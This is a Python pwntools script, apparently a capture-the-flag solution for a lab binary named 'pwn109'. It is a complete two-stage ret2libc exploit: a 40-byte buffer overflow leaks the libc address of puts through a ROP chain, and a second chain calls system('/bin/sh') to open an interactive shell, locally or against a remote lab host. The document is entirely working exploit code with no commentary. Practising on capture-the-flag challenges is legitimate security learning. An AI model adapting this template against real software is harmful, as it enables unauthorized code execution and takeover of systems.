#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF("./pwn109.pwn109", checksec=False)

#context.log_level = "debug"

if args.REMOTE:
    p = remote("10.10.53.55", 9009)
    libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so", checksec=False)
else:
    p = process(binary.path)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

# first pass, leak libc base address
rop = ROP(binary)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = b""
payload += 40 * b"A"
payload += p64(pop_rdi_ret)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendlineafter(b"Go ahead \xf0\x9f\x98\x8f\n", payload)

# rebase libc
address = u64(p.recv(8).strip().ljust(8, b"\x00"))
libc.address = address - libc.sym.puts

# second pass, ret2libc
payload = b""
payload += 40 * b"A"
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym.system)

p.sendlineafter(b"Go ahead \xf0\x9f\x98\x8f\n", payload)

p.interactive()
